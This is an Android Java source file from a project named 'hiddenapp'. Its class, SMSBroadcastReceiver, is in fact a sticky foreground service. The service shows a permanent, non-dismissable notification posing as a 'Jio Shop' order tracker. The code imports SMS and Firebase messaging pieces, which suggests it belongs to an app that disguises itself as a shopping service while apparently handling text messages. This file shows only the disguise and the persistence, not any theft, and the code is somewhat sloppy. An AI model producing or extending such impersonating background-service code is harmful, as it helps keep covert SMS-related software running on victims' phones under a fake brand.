package com.example.hiddenapp;

import android.app.Application;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.legacy.content.WakefulBroadcastReceiver;

import com.mijio.jioshop.LandingActivity;

import java.security.Provider;

import static android.content.Context.MODE_PRIVATE;
import static android.view.View.INVISIBLE;
import static androidx.core.app.NotificationCompat.PRIORITY_MIN;
import static com.example.hiddenapp.MyFirebaseMessagingService.stoore;

public class SMSBroadcastReceiver extends Service {

    private static final String TAG ="SMSbroadcastReceiver" ;



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Log.d(TAG, "onStartCommand: vvvvvvvvvvvvvv");
        Intent notificationintent=new Intent(this, LandingActivity.class);
        notificationintent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
        PendingIntent pendingIntent=PendingIntent.getActivity(this,0,new Intent(),0);
        Notification notification=new NotificationCompat.Builder(this,"hai")
                .setContentTitle("Track Order")
                .setContentText("Check your order Jio Shop")
                .setSmallIcon(R.drawable.six)
                .setOngoing(true)
                .setContentIntent(pendingIntent)
                .build();
        notification.flags=Notification.FLAG_NO_CLEAR;
        startForeground(1,notification);
        return START_STICKY;
    }
    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "hai notify";
            String description = "hai des";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel("hai", name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }


    }

}
